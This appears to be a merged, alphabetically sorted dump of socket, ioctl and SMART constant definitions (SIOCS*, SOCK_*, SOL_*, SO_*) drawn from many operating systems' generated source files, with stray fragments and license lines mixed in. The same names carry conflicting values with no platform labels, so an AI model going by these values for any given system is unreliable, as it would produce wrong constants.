SIOCSIFMTU                        = 0x80206934
SIOCSIFMTU                        = 0x8020697f
SIOCSIFMTU                        = 0x8090697f
SIOCSIFMTU                     = 0x80206934
SIOCSIFMTU                    = -0x7fd796a8
SIOCSIFMTU                    = -0x7fdf96eb
SIOCSIFMUXID                  = -0x7fdf96a7
SIOCSIFNAME                                 = 0x8923
SIOCSIFNAME                       = 0x80206928
SIOCSIFNAME                    = 0x80206928
SIOCSIFNAME                   = -0x7fdf96b7
SIOCSIFNETDUMP                = -0x7fd796e4
SIOCSIFNETMASK                              = 0x891c
SIOCSIFNETMASK                          = 0x80206916
SIOCSIFNETMASK                    = 0x80206916
SIOCSIFNETMASK                    = 0x80906916
SIOCSIFNETMASK                 = 0x80206916
SIOCSIFNETMASK                = -0x7fd796ea
SIOCSIFNETMASK                = -0x7fdf96e6
SIOCSIFOPTIONS                = -0x7fd796d7
SIOCSIFPAIR                       = 0x802069b0
SIOCSIFPARENT                     = 0x802069b2
SIOCSIFPFLAGS                               = 0x8934
SIOCSIFPHYADDR                          = 0x8040693e
SIOCSIFPHYADDR                    = 0x80406946
SIOCSIFPHYADDR                 = 0x80406946
SIOCSIFPHYS                             = 0x80206936
SIOCSIFPHYS                       = 0x80206936
SIOCSIFPHYS                    = 0x80206936
SIOCSIFPOLLCPU                    = 0x8020697d
SIOCSIFPRIORITY                   = 0x8020699b
SIOCSIFRDOMAIN                    = 0x8020699f
SIOCSIFRTLABEL                    = 0x80206982
SIOCSIFRVNET                   = 0xc020695b
SIOCSIFSLAVE                                = 0x8930
SIOCSIFSUBCHAN                = -0x7fd796e5
SIOCSIFTIMESLOT                   = 0x80206985
SIOCSIFTSOLEN                     = 0x8020697f
SIOCSIFTXQLEN                               = 0x8943
SIOCSIFVLAN                                 = 0x8983
SIOCSIFVLAN                             = 0x8020697e
SIOCSIFVNET                    = 0xc020695a
SIOCSIFXFLAGS                     = 0x8020699d
SIOCSIP6ADDRPOLICY            = -0x7fff965d
SIOCSIPMSFILTER               = -0x7ffb964b
SIOCSISNO                     = -0x7fd79694
SIOCSLANPCP                    = 0x80206999
SIOCSLGETREQ                  = -0x3fdf96b9
SIOCSLIFADDR                  = -0x7f879690
SIOCSLIFBRDADDR               = -0x7f879684
SIOCSLIFDSTADDR               = -0x7f87968e
SIOCSLIFFLAGS                 = -0x7f87968c
SIOCSLIFGROUPNAME             = -0x7f879665
SIOCSLIFINDEX                 = -0x7f87967a
SIOCSLIFLNKINFO               = -0x7f879675
SIOCSLIFMETRIC                = -0x7f879680
SIOCSLIFMTU                   = -0x7f879687
SIOCSLIFMUXID                 = -0x7f87967c
SIOCSLIFNAME                  = -0x3f87967f
SIOCSLIFNETMASK               = -0x7f879682
SIOCSLIFPHYADDR                   = 0x8118694a
SIOCSLIFPHYADDR                   = 0x8218694a
SIOCSLIFPHYADDR = 0x8118694a
SIOCSLIFPHYDF                     = 0x802069c1
SIOCSLIFPHYECN                    = 0x802069c7
SIOCSLIFPHYRTABLE                 = 0x802069a1
SIOCSLIFPHYTTL                    = 0x802069a8
SIOCSLIFPREFIX                = -0x3f879641
SIOCSLIFSUBNET                = -0x7f879677
SIOCSLIFTOKEN                 = -0x7f879679
SIOCSLIFUSESRC                = -0x7f879650
SIOCSLIFZONE                  = -0x7f879655
SIOCSLINKSTR                      = 0x801c6988
SIOCSLINKSTR                      = 0x80286988
SIOCSLOADF                    = -0x3ffb967d
SIOCSLOWAT                              = 0x80047302
SIOCSLOWAT                        = 0x80047302
SIOCSLOWAT                     = 0x80047302
SIOCSLOWAT                    = -0x7ffb8cfe
SIOCSLOWAT                    = 0x80047302
SIOCSLOWAT                    = 0xffffffff80047302
SIOCSLSTAT                    = -0x7fdf96b8
SIOCSMIIREG                                 = 0x8949
SIOCSMSFILTER                 = -0x7ffb964d
SIOCSNETOPT                   = -0x7ffe96a6
SIOCSPGRP                               = 0x80047308
SIOCSPGRP                         = 0x80047308
SIOCSPGRP                        = 0x80047308
SIOCSPGRP                        = 0x8902
SIOCSPGRP                      = 0x80047308
SIOCSPGRP                     = -0x7ffb8cf8
SIOCSPGRP                     = 0x80047308
SIOCSPGRP                     = 0xffffffff80047308
SIOCSPROMISC                  = -0x7ffb96d0
SIOCSPWE3CTRLWORD                 = 0x802069dc
SIOCSPWE3FAT                      = 0x802069dd
SIOCSPWE3NEIGHBOR                 = 0x821869de
SIOCSQPTR                     = -0x3ffb9648
SIOCSRARP                                   = 0x8962
SIOCSRXHPRIO                      = 0x802069db
SIOCSSDSTATS                  = -0x3fdf96d2
SIOCSSESTATS                  = -0x3fdf96d1
SIOCSSPPPPARAMS                   = 0x80206993
SIOCSTUNFIB                    = 0x8020695f
SIOCSTXHPRIO                      = 0x802069c5
SIOCSUMBPARAM                     = 0x802069bf
SIOCSVH                           = 0xc02069f5
SIOCSVH                           = 0xc0906982
SIOCSVNETFLOWID                   = 0x802069c3
SIOCSVNETID                       = 0x802069a6
SIOCSWGDPID                       = 0xc018695b
SIOCSWGMAXFLOW                    = 0xc0186960
SIOCSWGMAXGROUP                   = 0xc018695d
SIOCSWSDPID                       = 0x8018695c
SIOCSWSPORTNO                     = 0xc060695f
SIOCSX25XLATE                 = -0x7fd7969d
SIOCSXARP                     = -0x7fff965a
SIOCTMYADDR                   = -0x3ff79670
SIOCTMYSITE                   = -0x3ff7966e
SIOCTONLINK                   = -0x3ff7966f
SIOCUPPER                     = -0x7fdf96d8
SIOCWANDEV                                  = 0x894a
SIOCX25RCV                    = -0x3fdf96c4
SIOCX25TBL                    = -0x3fdf96c3
SIOCX25XMT                    = -0x3fdf96c5
SIOCXPROTO                    = 0x20007337
SIOCZIFDATA                       = 0xc0946986
SIOCZIFDATA                       = 0xc0986986
SIO_GET_EXTENSION_FUNCTION_POINTER = IOC_INOUT 
SIO_KEEPALIVE_VALS                 = IOC_IN 
SIO_UDP_CONNRESET                  = IOC_IN 
SIPClientData                   uintptr
SIZE$/ 
SMACK_MAGIC                                 = 0x43415d53
SMART)_/ 
SMART_AUTOSAVE                              = 0xd2
SMART_AUTO_OFFLINE                          = 0xdb
SMART_DISABLE                               = 0xd9
SMART_ENABLE                                = 0xd8
SMART_HCYL_PASS                             = 0xc2
SMART_IMMEDIATE_OFFLINE                     = 0xd4
SMART_LCYL_PASS                             = 0x4f
SMART_READ_LOG_SECTOR                       = 0xd5
SMART_READ_THRESHOLDS                       = 0xd1
SMART_READ_VALUES                           = 0xd0
SMART_SAVE                                  = 0xd3
SMART_STATUS                                = 0xda
SMART_WRITE_LOG_SECTOR                      = 0xd6
SMART_WRITE_THRESHOLDS                      = 0xd7
SMB2_SUPER_MAGIC                            = 0xfe534d42
SMB_SUPER_MAGIC                             = 0x517b
SOCK
SOCKFS_MAGIC                                = 0x534f434b
SOCKPROTO)_/ 
SOCK_BUF_LOCK_MASK                          = 0x3
SOCK_CLOEXEC                      = 0x10000000
SOCK_CLOEXEC                      = 0x8000
SOCK_CLOEXEC                     = 0x400000
SOCK_CLOEXEC                     = 0x80000
SOCK_CLOEXEC                   = 0x10000000
SOCK_CLOEXEC                  = 0x80000
SOCK_CONN_DGRAM                 = 6
SOCK_CONN_DGRAM               = 0x6
SOCK_DCCP                                   = 0x6
SOCK_DGRAM                              = 0x2
SOCK_DGRAM                        = 0x2
SOCK_DGRAM                       = 0x1
SOCK_DGRAM                       = 0x2
SOCK_DGRAM                      = 2
SOCK_DGRAM                     = 0x2
SOCK_DGRAM                    = 0x1
SOCK_DGRAM                    = 0x2
SOCK_DGRAM     = 2
SOCK_DNS                          = 0x1000
SOCK_FLAGS_MASK                   = 0xf0000000
SOCK_IOC_TYPE                               = 0x89
SOCK_MAXADDRLEN                         = 0xff
SOCK_MAXADDRLEN                   = 0xff
SOCK_MAXADDRLEN                = 0xff
SOCK_NDELAY                   = 0x200000
SOCK_NONBLOCK                     = 0x20000000
SOCK_NONBLOCK                     = 0x4000
SOCK_NONBLOCK                    = 0x4000
SOCK_NONBLOCK                    = 0x80
SOCK_NONBLOCK                    = 0x800
SOCK_NONBLOCK                  = 0x20000000
SOCK_NONBLOCK                 = 0x100000
SOCK_NOSIGPIPE                    = 0x40000000
SOCK_PACKET                                 = 0xa
SOCK_RAW                                    = 0x3
SOCK_RAW                                = 0x3
SOCK_RAW                          = 0x3
SOCK_RAW                        = 3
SOCK_RAW                       = 0x3
SOCK_RAW                      = 0x3
SOCK_RAW                      = 0x4
SOCK_RAW       = 3
SOCK_RCVBUF_LOCK                            = 0x2
SOCK_RDM                                    = 0x4
SOCK_RDM                                = 0x4
SOCK_RDM                          = 0x4
SOCK_RDM                        = 4
SOCK_RDM                       = 0x4
SOCK_RDM                      = 0x4
SOCK_RDM                      = 0x5
SOCK_RDM       = 4
SOCK_SEQPACKET                              = 0x5
SOCK_SEQPACKET                          = 0x5
SOCK_SEQPACKET                    = 0x5
SOCK_SEQPACKET                  = 5
SOCK_SEQPACKET                 = 0x5
SOCK_SEQPACKET                = 0x5
SOCK_SEQPACKET                = 0x6
SOCK_SEQPACKET = 5
SOCK_SNDBUF_LOCK                            = 0x1
SOCK_STREAM                             = 0x1
SOCK_STREAM                       = 0x1
SOCK_STREAM                      = 0x1
SOCK_STREAM                      = 0x2
SOCK_STREAM                     = 1
SOCK_STREAM                    = 0x1
SOCK_STREAM                   = 0x1
SOCK_STREAM                   = 0x2
SOCK_STREAM    = 1
SOCK_TXREHASH_DEFAULT                       = 0xff
SOCK_TXREHASH_DISABLED                      = 0x0
SOCK_TXREHASH_ENABLED                       = 0x1
SOCK_TYPE_MASK                = 0xffff
SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
SOFTWARE.
SOF_TIMESTAMPING_LAST = 0x8000
SOF_TIMESTAMPING_MASK = 0xffff
SOF_TIMESTAMPING_OPT_CMSG     = 0x400
SOF_TIMESTAMPING_OPT_ID       = 0x80
SOF_TIMESTAMPING_OPT_PKTINFO  = 0x2000
SOF_TIMESTAMPING_OPT_STATS    = 0x1000
SOF_TIMESTAMPING_OPT_TSONLY   = 0x800
SOF_TIMESTAMPING_OPT_TX_SWHW  = 0x4000
SOF_TIMESTAMPING_RAW_HARDWARE = 0x40
SOF_TIMESTAMPING_RX_HARDWARE  = 0x4
SOF_TIMESTAMPING_RX_SOFTWARE  = 0x8
SOF_TIMESTAMPING_SOFTWARE     = 0x10
SOF_TIMESTAMPING_SYS_HARDWARE = 0x20
SOF_TIMESTAMPING_TX_ACK       = 0x200
SOF_TIMESTAMPING_TX_HARDWARE  = 0x1
SOF_TIMESTAMPING_TX_SCHED     = 0x100
SOF_TIMESTAMPING_TX_SOFTWARE  = 0x2
SOL_AAL                                     = 0x109
SOL_AH                          = 51
SOL_ALG                                     = 0x117
SOL_ATM                                     = 0x108
SOL_BLUETOOTH = 0x112
SOL_CAIF                                    = 0x116
SOL_CAN_BASE                                = 0x64
SOL_CAN_RAW                                 = 0x65
SOL_DCCP                                    = 0x10d
SOL_DECNET                                  = 0x105
SOL_DSTOPTS                     = 60
SOL_EGP                         = 8
SOL_ESP                         = 50
SOL_FILTER                    = 0xfffc
SOL_FRAGMENT                    = 44
SOL_GGP                         = 2
SOL_HCI       = 0x0
SOL_HOPOPTS                     = 0
SOL_ICMP                        = 1
SOL_ICMPV6                                  = 0x3a
SOL_ICMPV6                      = 58
SOL_IDP                         = 22
SOL_IP                                      = 0x0
SOL_IP                          = 0
SOL_IPV6                                    = 0x29
SOL_IPV6                        = 41
SOL_IRDA                                    = 0x10a
SOL_IUCV                                    = 0x115
SOL_KCM                                     = 0x119
SOL_L2CAP     = 0x6
SOL_LLC                                     = 0x10c
SOL_LOCAL                               = 0x0
SOL_LOCAL                      = 0x0
SOL_MAX                         = 256
SOL_MCTP                                    = 0x11d
SOL_MPTCP                                   = 0x11c
SOL_NETBEUI                                 = 0x10b
SOL_NETLINK                                 = 0x10e
SOL_NFC                                     = 0x118
SOL_NONE                        = 59
SOL_PACKET                                  = 0x107
SOL_PACKET                    = 0xfffd
SOL_PNPIPE                                  = 0x113
SOL_PPPOL2TP                                = 0x111
SOL_PUP                         = 12
SOL_RAW                                     = 0xff
SOL_RAW                         = 255
SOL_RDS                                     = 0x114
SOL_RFCOMM    = 0x12
SOL_ROUTE                     = 0xfffe
SOL_ROUTING                     = 43
SOL_RXRPC                                   = 0x110
SOL_SCO       = 0x11
SOL_SOCKET                              = 0xffff
SOL_SOCKET                        = 0xffff
SOL_SOCKET                       = 0x1
SOL_SOCKET                       = 0xffff
SOL_SOCKET                      = 0xffff
SOL_SOCKET                     = 0xffff
SOL_SOCKET                    = 0xffff
SOL_SOCKET                = 0xffff
SOL_TCP                                     = 0x6
SOL_TCP                         = 6
SOL_TIPC                                    = 0x10f
SOL_TLS                                     = 0x11a
SOL_UDP                         = 17
SOL_X25                                     = 0x106
SOL_XDP                                     = 0x11b
SOMAXCONN                                   = 0x1000
SOMAXCONN                               = 0x80
SOMAXCONN                         = 0x80
SOMAXCONN                       = 10
SOMAXCONN                      = 0x80
SOMAXCONN                     = 0x400
SOMAXCONN                     = 0x80
SOMAXCONN = 0x7fffffff
SO_ACCEPTCONN                           = 0x2
SO_ACCEPTCONN                     = 0x2
SO_ACCEPTCONN                    = 0x1009
SO_ACCEPTCONN                    = 0x1e
SO_ACCEPTCONN                    = 0x8000
SO_ACCEPTCONN                   = 0x0002
SO_ACCEPTCONN                  = 0x2
SO_ACCEPTCONN                 = 0x2
SO_ACCEPTECONNABORTED           = 0x0006
SO_ACCEPTFILTER                   = 0x1000
SO_ACCEPTFILTER                = 0x1000
SO_ACKNOW                       = 0x7700
SO_ALL                        = 0x3f
SO_ALLZONES                   = 0x1014
SO_ANON_MLP                   = 0x100a
SO_ATTACH_BPF                    = 0x32
SO_ATTACH_BPF                    = 0x34
SO_ATTACH_FILTER                            = 0x1a
SO_ATTACH_FILTER              = 0x40000001
SO_ATTACH_REUSEPORT_CBPF         = 0x33
SO_ATTACH_REUSEPORT_CBPF         = 0x35
SO_ATTACH_REUSEPORT_EBPF         = 0x34
SO_ATTACH_REUSEPORT_EBPF         = 0x36
SO_AUDIT                      = 0x8000
SO_BAND                       = 0x4000
SO_BINDANY                        = 0x1000
SO_BINDTODEVICE                  = 0x19
SO_BINDTODEVICE                  = 0xd
SO_BINDTOIFINDEX                 = 0x3e
SO_BINDTOIFINDEX                 = 0x41
SO_BINTIME                     = 0x2000
SO_BPF_EXTENSIONS                = 0x30
SO_BPF_EXTENSIONS                = 0x32
SO_BROADCAST                            = 0x20
SO_BROADCAST                      = 0x20
SO_BROADCAST                     = 0x20
SO_BROADCAST                     = 0x6
SO_BROADCAST                    = 0x0020
SO_BROADCAST                   = 0x20
SO_BROADCAST                  = 0x20
SO_BROADCAST              = 32
SO_BSDCOMPAT                     = 0x400
SO_BSDCOMPAT                     = 0xe
SO_BUF_LOCK                      = 0x48
SO_BUF_LOCK                      = 0x51
SO_BULKMODE                     = 0x8000
SO_BUSY_POLL                     = 0x2e
SO_BUSY_POLL                     = 0x30
SO_BUSY_POLL_BUDGET              = 0x46
SO_BUSY_POLL_BUDGET              = 0x49
SO_CKSUMRECV                    = 0x0800
SO_CKSUMRECV                  = 0x800
SO_CLOSE                        = 0x01
SO_CLUSTERCONNTYPE              = 0x00004001
SO_CLUSTERCONNTYPE_INTERNAL     = 8
SO_CLUSTERCONNTYPE_NOCONN       = 0
SO_CLUSTERCONNTYPE_NONE         = 1
SO_CLUSTERCONNTYPE_SAME_CLUSTER = 2
SO_CLUSTERCONNTYPE_SAME_IMAGE   = 4
SO_CNX_ADVICE                    = 0x35
SO_CNX_ADVICE                    = 0x37
SO_COOKIE                        = 0x39
SO_COOKIE                        = 0x3b
SO_COPYOPT                    = 0x80000
SO_CPUHINT                        = 0x1030
SO_DEBUG                                    = 0x1
SO_DEBUG                                = 0x1
SO_DEBUG                          = 0x1
SO_DEBUG                        = 0x0001
SO_DEBUG                       = 0x1
SO_DEBUG                      = 0x1
SO_DELIM                      = 0x8000
SO_DETACH_BPF                               = 0x1b
SO_DETACH_FILTER                            = 0x1b
SO_DETACH_FILTER              = 0x40000002
SO_DETACH_REUSEPORT_BPF          = 0x44
SO_DETACH_REUSEPORT_BPF          = 0x47
SO_DGRAM_ERRIND               = 0x200
SO_DOMAIN                         = 0x1024
SO_DOMAIN                        = 0x1029
SO_DOMAIN                        = 0x27
SO_DOMAIN                      = 0x1019
SO_DOMAIN                     = 0x100c
SO_DONTLINGER                 = -0x81
SO_DONTROUTE                            = 0x10
SO_DONTROUTE                      = 0x10
SO_DONTROUTE                     = 0x10
SO_DONTROUTE                     = 0x5
SO_DONTROUTE                    = 0x0010
SO_DONTROUTE                   = 0x10
SO_DONTROUTE                  = 0x10
SO_DONTROUTE              = 16
SO_DONTTRUNC                            = 0x2000
SO_EE_CODE_TXTIME_INVALID_PARAM             = 0x1
SO_EE_CODE_TXTIME_MISSED                    = 0x2
SO_EE_CODE_ZEROCOPY_COPIED                  = 0x1
SO_EE_ORIGIN_ICMP                           = 0x2
SO_EE_ORIGIN_ICMP6                          = 0x3
SO_EE_ORIGIN_LOCAL                          = 0x1
SO_EE_ORIGIN_NONE                           = 0x0
SO_EE_ORIGIN_TIMESTAMPING                   = 0x4
SO_EE_ORIGIN_TXSTATUS                       = 0x4
SO_EE_ORIGIN_TXTIME                         = 0x6
SO_EE_ORIGIN_ZEROCOPY                       = 0x5
SO_EE_RFC4884_FLAG_INVALID                  = 0x1
SO_ERROPT                     = 0x40000
SO_ERROR                                = 0x1007
SO_ERROR                          = 0x1007
SO_ERROR                         = 0x1007
SO_ERROR                         = 0x4
SO_ERROR                        = 0x1007
SO_ERROR                       = 0x1007
SO_ERROR                      = 0x1007
SO_EXCLBIND                   = 0x1015
SO_GET_FILTER                               = 0x1a
SO_HIWAT                      = 0x10
SO_IGNOREINCOMINGPUSH           = 0x1
SO_IGNORESOURCEVIPA             = 0x0002
SO_INCOMING_CPU                  = 0x31
SO_INCOMING_CPU                  = 0x33
SO_INCOMING_NAPI_ID              = 0x38
SO_INCOMING_NAPI_ID              = 0x3a
SO_ISNTTY                     = 0x800
SO_ISTTY                      = 0x400
SO_KEEPALIVE                            = 0x8
SO_KEEPALIVE                      = 0x8
SO_KEEPALIVE                     = 0x8
SO_KEEPALIVE                     = 0x9
SO_KEEPALIVE                    = 0x0008
SO_KEEPALIVE                   = 0x8
SO_KEEPALIVE                  = 0x8
SO_KEEPALIVE              = 8
SO_KERNACCEPT                 = 0x2000
SO_LABEL                                = 0x1010
SO_LABEL                       = 0x1009
SO_LINGER                               = 0x80
SO_LINGER                         = 0x80
SO_LINGER                        = 0x80
SO_LINGER                        = 0xd
SO_LINGER                       = 0x0080
SO_LINGER                      = 0x80
SO_LINGER                     = 0x80
SO_LINGER                 = 128
SO_LINGER_SEC                           = 0x1080
SO_LISTENINCQLEN               = 0x1013
SO_LISTENQLEN                  = 0x1012
SO_LISTENQLIMIT                = 0x1011
SO_LOCK_FILTER                   = 0x28
SO_LOCK_FILTER                   = 0x2c
SO_LOWAT                      = 0x20
SO_MAC_EXEMPT                 = 0x100b
SO_MAC_IMPLICIT               = 0x1016
SO_MARK                          = 0x22
SO_MARK                          = 0x24
SO_MAXBLK                     = 0x100000
SO_MAXPSZ                     = 0x8
SO_MAX_PACING_RATE               = 0x2f
SO_MAX_PACING_RATE               = 0x31
SO_MAX_PACING_RATE             = 0x1018
SO_MEMINFO                       = 0x37
SO_MEMINFO                       = 0x39
SO_MINPSZ                     = 0x4
SO_MREADOFF                   = 0x80
SO_MREADON                    = 0x40
SO_NDELOFF                    = 0x200
SO_NDELON                     = 0x100
SO_NETNS_COOKIE                  = 0x47
SO_NETNS_COOKIE                  = 0x50
SO_NETPROC                        = 0x1020
SO_NETSVC_MARKING_LEVEL                 = 0x1119
SO_NET_SERVICE_TYPE                     = 0x1116
SO_NKE                                  = 0x1021
SO_NOADDRERR                            = 0x1023
SO_NODELIM                    = 0x10000
SO_NOFCS                         = 0x27
SO_NOFCS                         = 0x2b
SO_NOHEADER                       = 0x100a
SO_NOMULTIPATH                = 0x4000
SO_NONBLOCKLOCAL                = 0x8001
SO_NOREUSEADDR                  = 0x1000
SO_NOREUSEADDR                = 0x1000
SO_NOSIGPIPE                            = 0x1022
SO_NOSIGPIPE                      = 0x800
SO_NOSIGPIPE                   = 0x800
SO_NOTIFYCONFLICT                       = 0x1026
SO_NO_CHECK                                 = 0xb
SO_NO_DDP                      = 0x8000
SO_NO_OFFLOAD                  = 0x4000
SO_NP_EXTENSIONS                        = 0x1083
SO_NREAD                                = 0x1020
SO_NUMRCVPKT                            = 0x1112
SO_NWRITE                               = 0x1024
SO_OOBINLINE                            = 0x100
SO_OOBINLINE                      = 0x100
SO_OOBINLINE                     = 0x100
SO_OOBINLINE                     = 0xa
SO_OOBINLINE                    = 0x0100
SO_OOBINLINE                   = 0x100
SO_OOBINLINE                  = 0x100
SO_OPTACK                       = 0x8004
SO_OPTMSS                       = 0x8003
SO_OVERFLOWED                     = 0x1009
SO_PASSCRED                      = 0x10
SO_PASSCRED                      = 0x11
SO_PASSCRED                      = 0x14
SO_PASSCRED                      = 0x2
SO_PASSSEC                       = 0x1f
SO_PASSSEC                       = 0x22
SO_PEEK_OFF                      = 0x26
SO_PEEK_OFF                      = 0x2a
SO_PEERCRED                       = 0x1022
SO_PEERCRED                      = 0x11
SO_PEERCRED                      = 0x12
SO_PEERCRED                      = 0x15
SO_PEERCRED                      = 0x40
SO_PEERGROUPS                    = 0x3b
SO_PEERGROUPS                    = 0x3d
SO_PEERID                     = 0x1009
SO_PEERLABEL                            = 0x1011
SO_PEERLABEL                   = 0x1010
SO_PEERNAME                                 = 0x1c
SO_PEERSEC                       = 0x1e
SO_PEERSEC                       = 0x1f
SO_PREFER_BUSY_POLL              = 0x45
SO_PREFER_BUSY_POLL              = 0x48
SO_PRIORITY                                 = 0xc
SO_PROTOCOL                       = 0x1025
SO_PROTOCOL                      = 0x1028
SO_PROTOCOL                      = 0x26
SO_PROTOCOL                    = 0x1016
SO_PROTOTYPE                   = 0x1016
SO_PROTOTYPE                  = 0x1009
SO_RANDOMPORT                           = 0x1082
SO_RCVBUF                               = 0x1002
SO_RCVBUF                         = 0x1002
SO_RCVBUF                        = 0x1002
SO_RCVBUF                        = 0x8
SO_RCVBUF                       = 0x1002
SO_RCVBUF                      = 0x1002
SO_RCVBUF                     = 0x1002
SO_RCVBUF                 = 0x1002
SO_RCVBUFFORCE                   = 0x100b
SO_RCVBUFFORCE                   = 0x21
SO_RCVLOWAT                             = 0x1004
SO_RCVLOWAT                       = 0x1004
SO_RCVLOWAT                      = 0x10
SO_RCVLOWAT                      = 0x1004
SO_RCVLOWAT                      = 0x12
SO_RCVLOWAT                      = 0x800
SO_RCVLOWAT                     = 0x1004
SO_RCVLOWAT                    = 0x1004
SO_RCVLOWAT                   = 0x1004
SO_RCVMARK                       = 0x4b
SO_RCVMARK                       = 0x54
SO_RCVPSH                     = 0x100d
SO_RCVTIMEO                             = 0x1006
SO_RCVTIMEO                       = 0x1006
SO_RCVTIMEO                       = 0x100c
SO_RCVTIMEO                      = 0x1006
SO_RCVTIMEO                      = 0x12
SO_RCVTIMEO                      = 0x14
SO_RCVTIMEO                      = 0x2000
SO_RCVTIMEO                     = 0x1006
SO_RCVTIMEO                    = 0x1006
SO_RCVTIMEO                   = 0x1006
SO_RCVTIMEO               = 0x1006
SO_RCVTIMEO_NEW                  = 0x42
SO_RCVTIMEO_NEW                  = 0x44
SO_RCVTIMEO_OLD                  = 0x1006
SO_RCVTIMEO_OLD                  = 0x12
SO_RCVTIMEO_OLD                  = 0x14
SO_RCVTIMEO_OLD                  = 0x2000
SO_READOPT                    = 0x1
SO_RECVUCRED                  = 0x400
SO_RERROR                         = 0x2000
SO_RESERVE_MEM                   = 0x49
SO_RESERVE_MEM                   = 0x52
SO_REUSEADDR                            = 0x4
SO_REUSEADDR                      = 0x4
SO_REUSEADDR                     = 0x2
SO_REUSEADDR                     = 0x4
SO_REUSEADDR                    = 0x0004
SO_REUSEADDR                   = 0x4
SO_REUSEADDR                  = 0x4
SO_REUSEADDR              = 4
SO_REUSEPORT                            = 0x200
SO_REUSEPORT                      = 0x200
SO_REUSEPORT                     = 0x200
SO_REUSEPORT                     = 0xf
SO_REUSEPORT                    = 0x0200
SO_REUSEPORT                   = 0x200
SO_REUSEPORT                  = 0x200
SO_REUSEPORT_LB                = 0x10000
SO_REUSESHAREUID                        = 0x1025
SO_RTABLE                         = 0x1021
SO_RXQ_OVFL                      = 0x24
SO_RXQ_OVFL                      = 0x28
SO_SECATTR                    = 0x1011
SO_SECINFO                      = 0x00004002
SO_SECURITY_AUTHENTICATION       = 0x16
SO_SECURITY_AUTHENTICATION       = 0x5001
SO_SECURITY_ENCRYPTION_NETWORK   = 0x18
SO_SECURITY_ENCRYPTION_NETWORK   = 0x5004
SO_SECURITY_ENCRYPTION_TRANSPORT = 0x17
SO_SECURITY_ENCRYPTION_TRANSPORT = 0x5002
SO_SELECT_ERR_QUEUE              = 0x29
SO_SELECT_ERR_QUEUE              = 0x2d
SO_SET                          = 0x0200
SO_SETFIB                      = 0x1014
SO_SNDBUF                               = 0x1001
SO_SNDBUF                         = 0x1001
SO_SNDBUF                        = 0x1001
SO_SNDBUF                        = 0x7
SO_SNDBUF                       = 0x1001
SO_SNDBUF                      = 0x1001
SO_SNDBUF                     = 0x1001
SO_SNDBUF                 = 0x1001
SO_SNDBUFFORCE                   = 0x100a
SO_SNDBUFFORCE                   = 0x1f
SO_SNDBUFFORCE                   = 0x20
SO_SNDLOWAT                             = 0x1003
SO_SNDLOWAT                       = 0x1003
SO_SNDLOWAT                      = 0x1000
SO_SNDLOWAT                      = 0x1003
SO_SNDLOWAT                      = 0x11
SO_SNDLOWAT                      = 0x13
SO_SNDLOWAT                     = 0x1003
SO_SNDLOWAT                    = 0x1003
SO_SNDLOWAT                   = 0x1003
SO_SNDSPACE                       = 0x100a
SO_SNDTIMEO                             = 0x1005
SO_SNDTIMEO                       = 0x1005
SO_SNDTIMEO                       = 0x100b
SO_SNDTIMEO                      = 0x1005
SO_SNDTIMEO                      = 0x13
SO_SNDTIMEO                      = 0x15
SO_SNDTIMEO                      = 0x4000
SO_SNDTIMEO                     = 0x1005
SO_SNDTIMEO                    = 0x1005
SO_SNDTIMEO                   = 0x1005
SO_SNDTIMEO_NEW                  = 0x43
SO_SNDTIMEO_NEW                  = 0x45
SO_SNDTIMEO_OLD                  = 0x1005
SO_SNDTIMEO_OLD                  = 0x13
SO_SNDTIMEO_OLD                  = 0x15
SO_SNDTIMEO_OLD                  = 0x4000
SO_SPLICE                         = 0x1023
SO_STRHOLD                    = 0x20000
SO_STYLE                         = 0x1008
SO_TAIL                       = 0x200000
SO_TIMESTAMP                                = 0x1d
SO_TIMESTAMP                            = 0x400
SO_TIMESTAMP                      = 0x2000
SO_TIMESTAMP                      = 0x400
SO_TIMESTAMP                      = 0x800
SO_TIMESTAMP                   = 0x400
SO_TIMESTAMP                  = 0x1013
SO_TIMESTAMPING                  = 0x23
SO_TIMESTAMPING                  = 0x25
SO_TIMESTAMPING_NEW              = 0x41
SO_TIMESTAMPING_NEW              = 0x43
SO_TIMESTAMPING_OLD              = 0x23
SO_TIMESTAMPING_OLD              = 0x25
SO_TIMESTAMPNS                   = 0x21
SO_TIMESTAMPNS                   = 0x23
SO_TIMESTAMPNS                = 0x100a
SO_TIMESTAMPNS_NEW               = 0x40
SO_TIMESTAMPNS_NEW               = 0x42
SO_TIMESTAMPNS_OLD               = 0x21
SO_TIMESTAMPNS_OLD               = 0x23
SO_TIMESTAMP_MONOTONIC                  = 0x800
SO_TIMESTAMP_NEW                 = 0x3f
SO_TIMESTAMP_NEW                 = 0x46
SO_TIMESTAMP_OLD                            = 0x1d
SO_TONSTOP                    = 0x2000
SO_TOSTOP                     = 0x1000
SO_TRACKER_ATTRIBUTE_FLAGS_APP_APPROVED = 0x1
SO_TRACKER_ATTRIBUTE_FLAGS_DOMAIN_SHORT = 0x4
SO_TRACKER_ATTRIBUTE_FLAGS_TRACKER      = 0x2
SO_TRACKER_TRANSPARENCY_VERSION         = 0x3
SO_TS_BINTIME                  = 0x1
SO_TS_CLOCK                    = 0x1017
SO_TS_CLOCK_MAX                = 0x3
SO_TS_DEFAULT                  = 0x0
SO_TS_MONOTONIC                = 0x3
SO_TS_REALTIME                 = 0x2
SO_TS_REALTIME_MICRO           = 0x0
SO_TXREHASH                      = 0x4a
SO_TXREHASH                      = 0x53
SO_TXTIME                        = 0x3d
SO_TXTIME                        = 0x3f
SO_TYPE                                 = 0x1008
SO_TYPE                           = 0x1008
SO_TYPE                          = 0x1008
SO_TYPE                          = 0x3
SO_TYPE                         = 0x1008
SO_TYPE                        = 0x1008
SO_TYPE                       = 0x1008
SO_UNSET                        = 0x0400
SO_UPCALLCLOSEWAIT                      = 0x1027
SO_UPDATE_ACCEPT_CONTEXT  = 0x700b
SO_UPDATE_CONNECT_CONTEXT = 0x7010
SO_USELOOPBACK                          = 0x40
SO_USELOOPBACK                    = 0x40
SO_USELOOPBACK                  = 0x0040
SO_USELOOPBACK                 = 0x40
SO_USELOOPBACK                = 0x40
SO_USER_COOKIE                 = 0x1015
SO_USE_IFBUFS                   = 0x0400
SO_USE_IFBUFS                 = 0x400
SO_VENDOR                      = 0x80000000
SO_VM_SOCKETS_BUFFER_MAX_SIZE               = 0x2
SO_VM_SOCKETS_BUFFER_MIN_SIZE               = 0x1
SO_VM_SOCKETS_BUFFER_SIZE                   = 0x0
SO_VM_SOCKETS_CONNECT_TIMEOUT               = 0x6
SO_VM_SOCKETS_CONNECT_TIMEOUT_NEW           = 0x8
